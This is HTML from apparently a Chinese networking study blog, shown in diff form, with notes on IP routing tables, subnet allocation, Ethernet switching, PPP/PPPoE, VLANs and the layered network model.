-<h4 id="4-3-路由器转发IP数据报"><a href="#4-3-路由器转发IP数据报" class="headerlink" title="4.3 路由器转发IP数据报"></a><strong>4.3 路由器转发IP数据报</strong></h4><p>路由器根据路由表转发IP数据报，下面以下图为例解释。图中两台路由器A与B各有4个接口，连接了多个网络，网络1到网络4都有200台计算机，它们的网络IP地址分别是1.1.1.0/24、2.2.2.0/24、3.3.3.0/24、4.4.4.0/24。路由器A接口3的IP地址是5.5.5.1，路由器B接口3的IP地址是5.5.5.2。</p>
-<p><img src="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/1616164078321.png" alt="1616164078321"></p>
-<p>路由器A与B连接4个网络</p>
-<p>路由表有两列最基本的数据：目的IP地址与下一跳。路由器A的路由表如下表所示，第1行的含义是对于目的IP地址为1.1.1.1的IP数据报，应该发往接口1，其他行依次类推。路由器转发IP数据报时先查找路由表，再根据查询结果把IP数据报发往不同的接口。路由器B中也有类似的路由表。</p>
-<p>路由器A中的路由表</p>
-<table>
-<thead>
-<tr>
-<th>目的IP地址</th>
-<th>下一跳</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1.1.1.1</td>
-<td>接口1，直连</td>
-</tr>
-<tr>
-<td>1.1.1.2</td>
-<td>接口1，直连</td>
-</tr>
-<tr>
-<td>……</td>
-<td>……</td>
-</tr>
-<tr>
-<td>4.4.4.1</td>
-<td>接口3，5.5.5.2</td>
-</tr>
-<tr>
-<td>4.4.4.2</td>
-<td>接口3，5.5.5.2</td>
-</tr>
-<tr>
-<td>……</td>
-<td>……</td>
-</tr>
-</tbody></table>
-<p>理论上，世界上每一台计算机都要在路由表中占一行，路由表可能会有数十亿行。路由器需要多大的内存才能容纳下这样大的路由表？查询一次又需要多长时间？</p>
-<p>为解决这个难题，路由表一般只记录网络的IP地址（当然记录某台计算机的IP地址还是允许的），路由表得以大大缩小。此时还应记录网络IP地址的子网掩码，以搞清网络号的长度。在下表中，前4行就匹配了4个网络中所有的计算机，如3.3.3.1将匹配第3行，应该转发到接口3去。</p>
-<p>路由器A中缩小的路由表</p>
-<table>
-<thead>
-<tr>
-<th>目的网络IP地址及子网掩码</th>
-<th>下一跳</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1.1.1.0/24</td>
-<td>接口1，直连</td>
-</tr>
-<tr>
-<td>2.2.2.0/24</td>
-<td>接口2，直连</td>
-</tr>
-<tr>
-<td>3.3.3.0/24</td>
-<td>接口3，5.5.5.2</td>
-</tr>
-<tr>
-<td>4.4.4.0/24</td>
-<td>接口3，5.5.5.2</td>
-</tr>
-<tr>
-<td>默认</td>
-<td>接口4</td>
-</tr>
-</tbody></table>
-<p>缩小路由表的另一个办法是增加一行默认路由，表4.4中最后一行就是默认路由，它的含义是与其他行都不匹配的IP数据报都将转发到接口4去。默认路由应该最后使用，只有与其他所有行都不匹配时，才能使用默认路由，如6.6.6.6就匹配默认路由，应该转发到接口4去。</p>
-<p>目的IP地址可能匹配路由表中的两行或更多行。例如，1.1.0.0/16转发到接口1，1.1.1.0/24转发到接口2，目的IP地址1.1.1.1与这两行都匹配。这时应该使用最长前缀匹配规则，网络号越长，地址就越具体，就像寄信，知道收信人在山东省淄博市后，就直接把信送到淄博市邮政局，没有必要再送到山东省邮政局。</p>
-<h4 id="5-IP地址的分配"><a href="#5-IP地址的分配" class="headerlink" title="5 IP地址的分配"></a><strong>5 IP地址的分配</strong></h4><p>某单位申请到一个IP地址块，地址块内所有IP地址的网络号都是相同的，实际上就代表了一个子网，该单位可以在这个子网内再划分更小的子网。假设这个地址块的网络IP地址是1.1.1.0/24。</p>
-<p>在分配IP地址之前，要做规划。最主要的原则是考虑到以后的发展，要留上足够的未分配IP地址。要划分为4个子网，每个子网中计算机的最大数量分别是100、50、25、25。</p>
-<table>
-<thead>
-<tr>
-<th>子网</th>
-<th>子网IP地址</th>
-<th>第1个可分配IP地址</th>
-<th>最后1个可分配IP地址</th>
-<th>广播IP地址</th>
-<th>可分配IP地址数量</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td><strong>1.1.1.0</strong>00000001.1.1.0/25</td>
-<td><strong>1.1.1.0</strong>00000011.1.1.1</td>
-<td><strong>1.1.1.0</strong>11111101.1.1.126</td>
-<td><strong>1.1.1.0</strong>11111111.1.1.127</td>
-<td>126</td>
-</tr>
-<tr>
-<td>2</td>
-<td><strong>1.1.1.10</strong>0000001.1.1.128/26</td>
-<td><strong>1.1.1.10</strong>0000011.1.1.129</td>
-<td><strong>1.1.1.10</strong>1111101.1.1.190</td>
-<td><strong>1.1.1.10</strong>1111111.1.1.191</td>
-<td>62</td>
-</tr>
-<tr>
-<td>3</td>
-<td><strong>1.1.1.110</strong>000001.1.1.192/27</td>
-<td><strong>1.1.1.110</strong>000011.1.1.193</td>
-<td><strong>1.1.1.110</strong>111101.1.1.222</td>
-<td><strong>1.1.1.110</strong>111111.1.1.223</td>
-<td>30</td>
-</tr>
-<tr>
-<td>4</td>
-<td><strong>1.1.1.111</strong>000001.1.1.224/27</td>
-<td><strong>1.1.1.111</strong>000011.1.1.225</td>
-<td><strong>1.1.1.111</strong>111101.1.1.254</td>
-<td><strong>1.1.1.111</strong>111111.1.1.255</td>
-<td>30</td>
-</tr>
-</tbody></table>
-<p>在外部的路由器的路由表中，这4个子网可以占有4项，其实也可以占有一项，即1.1.1.0/24。也就是说，在外界看来，这4个子网其实是一个子网，这叫做<strong>路由聚合</strong>或<strong>地址聚合</strong>，“超网”的概念就是这样来的。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" rel="tag">网络协议分析</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-数据链路层"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"
-    >数据链路层</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/" class="article-date">
-  <time datetime="2021-03-08T01:44:04.000Z" itemprop="datePublished">2021-03-08</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><h3 id="1-以太网帧格式"><a href="#1-以太网帧格式" class="headerlink" title="1 以太网帧格式"></a>1 以太网帧格式</h3><p>前同步码长度8字节，内容是固定的，前7个字节都是10101010，最后一个字节是10101011。前同步码的作用是使接收方网卡的接收频率与发送方网卡的发送频率精确一致，这称为同步。<br>地址是物理地址，或称为MAC地址，或称为硬件地址，48位。全为1则是广播地址。<br>类型字段：用以实现复用与分用，说明数据字段是网络层什么协议的协议数据单元。例如：IP数据报0x0800，ARP数据0x0806。<br>数据少于46字节，则需要填充。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615217511176.png" alt="1615217511176"></p>
-<h3 id="2-交换机"><a href="#2-交换机" class="headerlink" title="2 交换机"></a>2 交换机</h3><p>以太网早期使用网桥，实际就是2接口的交换机，现在则使用交换机。它工作在数据链路层，关键是它接收数据后，并不向所有其他接口转发，只向特定接口转发。这如何实现？需要<strong>转发表</strong>，如下图所示。交换机与集线器合作，缩小了碰撞域，减少了碰撞，提高了效率。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615217794624.png" alt="1615217794624"></p>
-<p>这里的关键是转发表如何产生，管理员手工输入不现实，有必要让交换机自动生成这个表。交换机刚开机时转发表是空的，当交换机收到一个帧时，它查看帧中的源物理地址，把它与相应的接口填到转发表中。如上图所示。这一过程叫做交换机的<strong>自学习</strong>。<br>转发表中查不到目的物理地址时如何转发？对策是向接收接口外的其他所有接口转发，这种情况的持续时间不会长，因为转发表很快就会填满。最后一个问题是如果计算机更换了网卡，物理地址变了，这会在转发表中产生一个新行，旧的那一行却会长期留在转发表中。转发表中增加了第3列，记录这一行产生的时间，一段时间后，如果一直没有收到以该行地址为源物理地址的帧，就删除这一行。<br>现在通常只使用交换机，不再使用网桥与集线器，这时不会再有碰撞，可以无碰撞地传输数据。交换机通常是<strong>存储转发</strong>的，但也有直通的，好处是效率高，缺点是无法进行CRC校验，可能会转发出有错的帧。现在有些交换机已经具有路由器的部分功能，叫做<strong>三层交换机</strong>，只能工作在数据链路层的则叫做<strong>二层交换机</strong>，或是链路层交换机。<br>无论是集线器，还是网桥与交换机，网络一定是树型结构，不能有环路。否则帧可能沿环路无休止地绕圈子，某些交换机甚至不能正常工作。很多交换机可以使用<strong>生成树协议</strong>来消除环路。</p>
-<h3 id="3-PPP协议"><a href="#3-PPP协议" class="headerlink" title="3 PPP协议"></a>3 PPP协议</h3><h4 id="3-1-PPP帧格式"><a href="#3-1-PPP帧格式" class="headerlink" title="3.1 PPP帧格式"></a>3.1 PPP帧格式</h4><p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615217852870.png" alt="1615217852870"></p>
-<p>首尾的标志长度1字节，是一个帧的开始标志，值是01111110。地址长度1字节，固定为11111111，点对点链路并不需要地址，至今仍未使用。控制长度1字节，固定为00000011，至今仍未使用。<br>协议长度2字节，用以实现复用与分用，说明数据字段是网络层什么协议的协议数据单元。例如0x0021说明数据字段是IP协议的协议数据单元，PPP协议实体就把数据交给IP协议实体。数据是不定长的，但不能超过1500字节。CRC长度2字节，发现差错时，PPP丢弃这一帧，不交给网络层实体，但是PPP并不改正这个差错。<br>为实现透明传输，PPP可以使用字节填充，转义字符为0x7D，若在数据部分中发现开始与结束标志，则在其前面插入0x7D，若在数据部分中发现0x7D，则在其前面也插入0x7D。接收时删除0x7D，以还原数据。PPP还可以使用零比特填充：发送方在数据部分中只要发现5个连续1，就插入一个0，保证不会出现6个连续1；接收方则在数据部分中只要发现5个连续1，就删除后面跟着的一个0，以还原数据。</p>
-<h4 id="3-2-PPP协议的工作状态"><a href="#3-2-PPP协议的工作状态" class="headerlink" title="3.2 PPP协议的工作状态"></a>3.2 PPP协议的工作状态</h4><p>PPP的开始与结束都是<strong>静止状态</strong>。在<strong>建立</strong>状态，通信双方会协商一些选项，这需要链路控制协议LCP。在<strong>鉴别状态</strong>将对通信双方的身份进行鉴别，这是可选的。<strong>网络层配置状态</strong>可以对网络层的协议进行配置，如动态分配IP地址，这需要网络控制协议（NCP）。在<strong>打开状态</strong>，PPP开始传输网络层的协议数据单元。所有数据传输完毕，PPP就进入<strong>终止状态</strong>，利用子协议LCP，通信双方交换一些控制信息，结束本次通信过程，然后转入<strong>静止状态</strong>。LCP与NCP的PDU封装在PPP帧中传输。PPP是面向连接的协议。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615217886645.png" alt="1615217886645"></p>
-<h4 id="3-3-PPPoE"><a href="#3-3-PPPoE" class="headerlink" title="3.3 PPPoE"></a>3.3 PPPoE</h4><p>以太网缺乏管理功能，但PPP协议具有强大的管理功能，PPP可以使用用户名与口令鉴别用户的身份，还可以对网络层的协议进行配置，如动态分配IP地址，利用PPP还可以实现记录上网时间与流量等更复杂的功能。<br>利用PPP管理以太网接入是一个好办法，但PPP是数据链路层的协议，以太网包括物理层与数据链路层的内容，二者如何协同工作呢？PPPoE可以做到这一点。PPPoE由RFC 2516定义，是PPP与以太网的结合体，IP数据报先封装在PPP帧中，PPP帧再封装在以太网帧中，如下图所示，PPP运行在以太网上层，所以叫做PPPoE。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615217993633.png" alt="1615217993633"></p>
-<h3 id="4-虚拟局域网VLAN"><a href="#4-虚拟局域网VLAN" class="headerlink" title="4 虚拟局域网VLAN"></a>4 虚拟局域网VLAN</h3><h4 id="4-1-大规模局域网的问题"><a href="#4-1-大规模局域网的问题" class="headerlink" title="4.1 大规模局域网的问题"></a>4.1 大规模局域网的问题</h4><p>当一个以太网规模过大时，会产生很多问题。最严重的是广播问题，可能导致严重的<strong>广播风暴。</strong>网络效率会明显下降。很多病毒也利用了广播帧，如流行的ARP欺骗病毒。虽然广播帧有很多用处，但对于一个具体的广播帧，并不一定每台计算机都需要，可能仅一部分计算机需要。发生这一问题的根源是<strong>广播域</strong>（若干计算机的集合，其中一台计算机发送广播帧，其他所有计算机都能收到）过大，<strong>一个广播域通常被认为是一个网络，不同的广播域则是不同的网络</strong>。应该把一个大的广播域划分为若干个小的广播域，也就是把一个大网络划分为若干个小网络。<br>使用路由器可以划分广播域，把一个大型网络分为几部分，路由器不转发广播帧，从而减小了广播域。一般认为路由器连接的是不同的网络，而交换机连接的是同一网络，所以这相当于把一个大的局域网物理上划分为几个小的局域网。与交换机相比，路由器价格较高、管理与维护复杂，而且同等价格下速率比交换机慢，用路由器划分广播域显然不是一个好办法。<br>除广播问题外，以太网的管理也很困难。例子如下图所示，如果想阻止计算机A与计算机D通信，一个办法是断开交换机1与交换机5的连线，这实际上是把一个局域网分割为互不连通的几个局域网。另一个办法是在交换机1上做一些设置，也可以阻止计算机A与计算机D通信。但是如果计算机A移动了位置，距离交换机3更近，需要就近连接到交换机3上，就必须在交换机3上再做同样的设置，或者是拉一根长线，仍把计算机连接到交换机1上。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615218032729.png" alt="1615218032729"></p>
-<h4 id="4-2-虚拟局域网VLAN"><a href="#4-2-虚拟局域网VLAN" class="headerlink" title="4.2 虚拟局域网VLAN"></a>4.2 虚拟局域网VLAN</h4><p>先搞清楚“虚拟”在计算机世界中的含义，逻辑与物理这两个词也经常使用。逻辑与虚拟类似，物理与真实类似。1996年3月，IEEE发布了<strong>虚拟局域网</strong>（Virtual LAN，VLAN）标准IEEE 802.1Q。在有VLAN功能的交换机上经过设置，可以把一个局域网划分为若干个VLAN。VLAN间能否相互通信可通过设置决定，不过广播帧是不能在VLAN间转发的。整个网络没有使用路由器，物理上还是一个局域网，但每个VLAN看起来都是一个独立的局域网，所以叫做虚拟局域网。<br>利用二层交换机划分VLAN时，VLAN间无法相互通信，必须增加一台路由器。更简单同时效率也更高的办法是利用三层交换机划分VLAN，利用三层交换机的路由器功能就能使VLAN间相互通信。<br>利用VLAN可以方便地划分广播域。根据上面的管理例子，利用VLAN还可以很方便地管理以太网，VLAN的划分可以做到与计算机所在的物理位置无关，将计算机A与计算机D划分到不同VLAN，即使计算机A与交换机1断开，连结到交换机4上，这时不需做任何修改，计算机A仍属于原来VLAN，还是不能与计算机D通信。<br>怎样把一台计算机划入某个VLAN呢？一是利用交换机接口划分VLAN，简单容易实现，但灵活性不好，一台计算机移动到另一个新接口时，如果新接口与旧接口属于不同的VLAN，这个计算机就不能再属于旧VLAN了。二是利用计算机物理地址划分VLAN，不论计算机在网络中怎样移动，只要其物理地址保持不变，该计算机就始终属于某个VLAN，不需要重新配置，但在一个大型网络中，管理员把每个物理地址一一划分到VLAN中，是十分繁琐的。三是利用计算机IP地址划分VLAN，这种方法的优点与利用物理地址划分VLAN类似，它的缺点是效率低，因为查看IP地址比查看物理地址更费时间。<br>划分VLAN时为每个VLAN分配一个整数，这个整数就是VLAN的标识符，不同的整数代表了不同的VLAN。为了实现VLAN功能，VLAN帧与标准的以太网帧有所不同，VLAN帧在以太网帧的首部中增加了一个字段，该字段包含了VLAN的标识符，如下图所示。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615218055228.png" alt="1615218055228"></p>
-<h3 id="5-小型校园网的物理层与数据链路层的解决方案"><a href="#5-小型校园网的物理层与数据链路层的解决方案" class="headerlink" title="5 小型校园网的物理层与数据链路层的解决方案"></a>5 小型校园网的物理层与数据链路层的解决方案</h3><p>局域网自然选用以太网，设备全部使用交换机，不使用集线器。由于计算机很多，星型拓扑结构是不行的，必须采用树型拓扑结构，位于办公楼的学院网络中心是校园网的管理机构，树型拓扑结构的根置于此处，同时也从此处接入互联网。<br>数据传输速率方面，一般计算机上使用100Mbps网卡就可以了，服务器则采用1 000Mbps网卡。由于10Gbps的设备价格比1000Mbps的设备贵很多，所以楼间光纤使用1 000Mbps速率，没有必要使用10Gbps速率，以后有必要时可以升级到10Gbps，升级很容易，光纤不需要动，只需更换交换机即可。校园网的总体结构如下图所示。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615218079056.png" alt="1615218079056"></p>
-<p>校园网内计算机数量众多，若只设一个网络，则广播域太大，同时管理也不方便。利用路由器可以把校园网划分为不同的网络，但与交换机相比，路由器价格较高、管理与维护复杂，而且速率比交换机慢。所以不应使用路由器划分网络，可以利用三层交换机与VLAN技术，把校园网划分为多个VLAN。<br>每个房间设一个网线插座，称为信息点，若要连入更多计算机，用户可以自行安装简易的交换机。每层楼设一台二层交换机，每座楼设一台三层交换机，交换机的接口数根据信息点数量确定。连接方法是信息点连至本层的二层交换机，二层交换机连至本楼的三层交换机，三层交换机再连至网络中心。图书馆的阅览室与办公楼的会议室各设两台无线AP，AP连入本层的二层交换机。<br>三层交换机启用VLAN功能，把每一层楼划分为不同的VLAN，并设置为允许不同VLAN间相互通信。某座楼内网络的结构如下图所示，其中二层交换机有100Mbps接口，也要有1 000Mbps接口，三层交换机则全部是1 000Mbps接口。</p>
-<p><img src="/2021/03/08/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/1615218102527.png" alt="1615218102527"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" rel="tag">网络协议分析</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-网络结构"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/"
-    >计算机网络体系总结构</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/" class="article-date">
-  <time datetime="2021-03-05T14:14:59.000Z" itemprop="datePublished">2021-03-05</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p><strong>计算机网络总体结构</strong></p>
-<h3 id="一-网络分层"><a href="#一-网络分层" class="headerlink" title="一.  网络分层"></a>一.  网络分层</h3><h4 id="1-物理层（physical-layer）"><a href="#1-物理层（physical-layer）" class="headerlink" title="1.物理层（physical layer）"></a>1.物理层（physical layer）</h4><p>物理层的任务就是传输<u>位流</u>。</p>
-<h4 id="2-数据链路层（data-link-layer）"><a href="#2-数据链路层（data-link-layer）" class="headerlink" title="2.数据链路层（data link layer）"></a>2.数据链路层（data link layer）</h4><p>数据链路层的任务是负责<u>相邻结点间</u>的通信。</p>
-<h4 id="3-网络层（network-layer）"><a href="#3-网络层（network-layer）" class="headerlink" title="3.网络层（network layer）"></a>3.网络层（network layer）</h4><p>网络层的任务是为数据在<u>网络中</u>选择一条合适的路径。</p>
-<h4 id="4-运输层（transport-layer）"><a href="#4-运输层（transport-layer）" class="headerlink" title="4.运输层（transport layer）"></a>4.运输层（transport layer）</h4><p>运输层的任务是负责不同计算机中两个<u>进程间</u>的通信。</p>
-<h4 id="5-应用层（application-layer）"><a href="#5-应用层（application-layer）" class="headerlink" title="5.应用层（application layer）"></a>5.应用层（application layer）</h4><p>应用层就是为了让用户能够使用网络，如浏览网页、QQ聊天、收发电子邮件。</p>
-<h3 id="二-计算机网络中的重要概念"><a href="#二-计算机网络中的重要概念" class="headerlink" title="二.  计算机网络中的重要概念"></a>二.  计算机网络中的重要概念</h3><p>用寄信的例子类比</p>
-<p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614954918622.png" alt="1614954918622"></p>
-<h4 id="1．实体（entity）"><a href="#1．实体（entity）" class="headerlink" title="1．实体（entity）"></a>1．实体（entity）</h4><p>实体指计算机网络中参与发送或接收数据的<strong>硬件</strong>或<strong>软件进程</strong>。不同的层有不同的实体，位于不同计算机中同一层内的实体称为<strong>对等实体</strong>。</p>
-<h4 id="2．服务（service）"><a href="#2．服务（service）" class="headerlink" title="2．服务（service）"></a>2．服务（service）</h4><p>下层实体提供给上层实体使用的功能称为服务。服务通常通过函数调用来实现。</p>
-<h4 id="3．协议（protocol）"><a href="#3．协议（protocol）" class="headerlink" title="3．协议（protocol）"></a>3．协议（protocol）</h4><p><strong>协议规定了两个对等实体进行通信时的数据格式，以及在收发数据时及其他事件发生时应进行的操作。</strong>既然协议是控制对等实体的，那么<strong>一个协议必然位于某一层内</strong>，不同的层内有不同的协议。因特网有两个最重要的协议TCP与IP，因此因特网的体系结构才称为TCP/IP体系结构。<br>有的协议非常简单，有的则非常复杂。很多复杂协议之所以复杂，是因为要对很多非正常情况进行处理，此时工作量远远超过了处理正常情况的工作量。</p>
-<h4 id="4．协议数据单元（protocol-data-unit，PDU）"><a href="#4．协议数据单元（protocol-data-unit，PDU）" class="headerlink" title="4．协议数据单元（protocol data unit，PDU）"></a>4．协议数据单元（protocol data unit，PDU）</h4><p>每层实体都有自己处理数据的单位。这种某层实体处理数据的单位称为该层的协议数据单元。PDU通常分为首部与数据两部分。</p>
-<h4 id="5．封装与拆封（encapsulation-and-decapsulation）"><a href="#5．封装与拆封（encapsulation-and-decapsulation）" class="headerlink" title="5．封装与拆封（encapsulation and decapsulation）"></a>5．封装与拆封（encapsulation and decapsulation）</h4><p>在上层实体交付的PDU外面加上首部形成本层PDU的过程称为封装。去掉本层PDU首部从而得到上层PDU的过程称为拆封或解封装。某层的接收实体只查看本层PDU的首部，这个首部则是发送方的同层对等实体加上的。</p>
-<h4 id="6．复用与分用"><a href="#6．复用与分用" class="headerlink" title="6．复用与分用"></a>6．复用与分用</h4><p>运输层中的复用与分用：</p>
-<p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614955208586.png" alt="1614955208586"></p>
-<p>其他层也有这个问题：某层可能有多个实体，下层向其提交数据时，应该给哪个实体？需要PDU首部中的一个字段加以区分。</p>
-<h3 id="三-网络的运作过程"><a href="#三-网络的运作过程" class="headerlink" title="三.  网络的运作过程"></a>三.  网络的运作过程</h3><p>计算机具有全部5层实体，工作过程容易理解。网络设备如何工作呢？<br>“集线器工作在物理层；交换机工作在数据链路层；路由器工作在网络层”的确切意思是指该设备会查看该层及其下面其他层的PDU的首部。路由器的工作原理：</p>
-<p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614955342673.png" alt="1614955342673"></p>
-<p>网络分层动画。</p>
-<h3 id="四-网络各层协议"><a href="#四-网络各层协议" class="headerlink" title="四. 网络各层协议"></a>四. 网络各层协议</h3><p><img src="/2021/03/05/%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/1614955410501.png" alt="1614955410501"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" rel="tag">网络协议分析</a></li></ul>
 
     </footer>
   </div>
